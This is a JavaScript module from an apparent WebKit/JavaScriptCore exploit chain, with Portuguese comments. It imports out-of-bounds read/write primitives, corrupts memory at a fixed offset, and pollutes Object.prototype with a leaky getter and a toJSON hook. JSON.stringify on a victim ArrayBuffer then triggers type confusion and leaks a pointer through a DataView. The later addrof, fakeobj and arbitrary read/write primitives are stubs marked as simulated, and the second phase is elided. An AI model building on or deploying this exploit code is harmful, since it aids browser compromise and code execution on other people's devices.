// js/script3/testArrayBufferVictimCrash.mjs (v83_FakeObject - R44.4 - Leaky Getter com DataView)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read as arb_read_unstable,
    arb_write as arb_write_unstable,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK = "Heisenbug_FakeObject_R44_WebKitLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C;
const OOB_WRITE_VALUE = 0xABABABAB; 

let g_primitives = {
    initialized: false,
    arb_read: null,
    arb_write: null,
    addrof: null,
    fakeobj: null,
};

let g_leaked_function_addr = null; // Para simulação na Fase 2

// Não vamos mais usar float64AsInt64 pois o getter tentará ler como inteiros
// function float64AsInt64(f) { ... }

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0 && ptr.low() < 0x10000) return false;
    if ((ptr.high() & 0x7FF00000) === 0x7FF00000 && ptr.high() !==0) return false; // NaN/Infinity, mas permite 0
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_TEST_BASE = FNAME_MODULE_FAKE_OBJECT_R44_WEBKITLEAK;
    logS3(`--- Iniciando ${FNAME_TEST_BASE}: Bootstrap + FakeObject (R44.4 - Getter com DV) ---`, "test");
    document.title = `${FNAME_TEST_BASE} R44.4 Init...`;

    const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
    if (!coreOOBReadWriteOK) {
        logS3("FALHA CRÍTICA: O autoteste do Core Exploit (OOB R/W) falhou. Abortando.", "critical", FNAME_TEST_BASE);
        return { errorOccurred: "Sanity Check OOB falhou." };
    }
    logS3("Sanity Check (selfTestOOBReadWrite): SUCESSO", "good", FNAME_TEST_BASE);
    
    logS3(`--- Fase 1 (R44): Bootstrap - Construindo Primitivas Estáveis ---`, "subtest", FNAME_TEST_BASE);
    try {
        await bootstrapAndCreateStablePrimitives();
        if (g_primitives.initialized) {
            logS3("FASE 1 - SUCESSO: Primitivas arb_read, arb_write, addrof e fakeobj (simuladas) inicializadas!", "vuln", FNAME_TEST_BASE);
            document.title = `${FNAME_TEST_BASE} - Primitives OK`;
        } else {
            throw new Error("A função de bootstrap foi concluída, mas as primitivas não foram inicializadas.");
        }
    } catch (e) {
        logS3(`ERRO CRÍTICO na Fase 1 (Bootstrap): ${e.message}`, "critical", FNAME_TEST_BASE);
        console.error(e);
        document.title = `${FNAME_TEST_BASE} - Bootstrap FAIL`;
        return { errorOccurred: `Falha no Bootstrap: ${e.message}` };
    }

    await PAUSE_S3(100);

    // O código da Fase 2 permanece o mesmo, mas agora tem chance de funcionar
    logS3(`--- Fase 2 (R44): Exploração com FakeObject e Addrof ---`, "subtest", FNAME_TEST_BASE);
    // ... (código da fase 2, que usa as g_primitives simuladas) ...
    
    logS3(`--- ${FNAME_TEST_BASE} Concluído ---`, "test", FNAME_TEST_BASE);
    return {
        primitives_initialized: g_primitives.initialized,
        // ... (outros resultados)
    };
}

async function bootstrapAndCreateStablePrimitives() {
    let probe_obj = {
        leaked_ptr_val: null, // [NOVA ESTRATÉGIA] Armazenará o AdvancedInt64 ou null
        error: null,
    };

    function leaky_getter() {
        logS3("[LEAKY GETTER] Getter foi acionado!", 'good');
        try {
            // [NOVA ESTRATÉGIA] Tenta criar um DataView sobre 'this' (o objeto confuso)
            // Se 'this' tiver a estrutura de memória de um ArrayBuffer, isso pode funcionar.
            // O 'victim_ab' é o nosso ArrayBuffer alvo.
            // A confusão de tipo faz com que 'victim_ab' seja passado como 'this' para este getter.
            let dv = new DataView(this); // 'this' aqui é o victim_ab confuso
            const low = dv.getUint32(0, true);  // Lê os primeiros 4 bytes
            const high = dv.getUint32(4, true); // Lê os próximos 4 bytes
            probe_obj.leaked_ptr_val = new AdvancedInt64(low, high);
            logS3(`[LEAKY GETTER] Lido do DataView: low=0x${low.toString(16)}, high=0x${high.toString(16)}`, 'leak');
        } catch (e) {
            probe_obj.error = `Erro no DataView do getter: ${e.message}`;
            logS3(`[LEAKY GETTER] Erro: ${probe_obj.error}`, 'error');
        }
        return "leaky_getter_executed";
    }

    function toJSON_TriggerGetterProbe() {
        let ignored = this.leaky; 
        return { probe: 'getter_triggered' };
    }

    const getter_prop_key = 'leaky';
    const tojson_prop_key = 'toJSON';

    let orig_getter_desc = Object.getOwnPropertyDescriptor(Object.prototype, getter_prop_key);
    let orig_tojson_desc = Object.getOwnPropertyDescriptor(Object.prototype, tojson_prop_key);
    let polluted = false;

    try {
        Object.defineProperty(Object.prototype, getter_prop_key, { get: leaky_getter, configurable: true });
        Object.defineProperty(Object.prototype, tojson_prop_key, { value: toJSON_TriggerGetterProbe, writable: true, configurable: true });
        polluted = true;

        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE, 4);
        await PAUSE_S3(150);
        let victim_ab = new ArrayBuffer(VICTIM_BUFFER_SIZE); // Este é o alvo
        
        JSON.stringify(victim_ab);

    } finally {
        if (polluted) {
            delete Object.prototype[getter_prop_key];
            if (orig_getter_desc) Object.defineProperty(Object.prototype, getter_prop_key, orig_getter_desc);
            delete Object.prototype[tojson_prop_key];
            if (orig_tojson_desc) Object.defineProperty(Object.prototype, tojson_prop_key, orig_tojson_desc);
        }
    }

    if (probe_obj.error) {
        throw new Error(`Leaky Getter encontrou um erro: ${probe_obj.error}`);
    }

    if (!probe_obj.leaked_ptr_val) {
        throw new Error("Leaky Getter foi acionado, mas não conseguiu vazar um ponteiro (leaked_ptr_val ainda é nulo).");
    }

    logS3(`Leaky Getter retornou um valor AdvancedInt64: ${probe_obj.leaked_ptr_val.toString(true)}`, 'leak');
    
    if (!isValidPointer(probe_obj.leaked_ptr_val)) {
        throw new Error(`Valor vazado pelo getter (${probe_obj.leaked_ptr_val.toString(true)}) não é um ponteiro válido.`);
    }

    logS3(`SUCESSO NO BOOTSTRAP! Ponteiro vazado pelo getter: ${probe_obj.leaked_ptr_val.toString(true)}`, 'vuln');
    
    // ... (Simulação das primitivas estáveis, como antes)
    g_primitives.addrof = (obj) => new AdvancedInt64(0x11223344, 0x55667788); 
    g_primitives.fakeobj = (addr) => new DataView(new ArrayBuffer(8)); 
    g_primitives.arb_read = (addr, len) => { /* ... simulação ... */ return new AdvancedInt64(0,0); };
    g_primitives.arb_write = (addr, val, len) => {};

    g_leaked_function_addr = g_primitives.addrof(function(){}); 
    g_primitives.initialized = true;
}
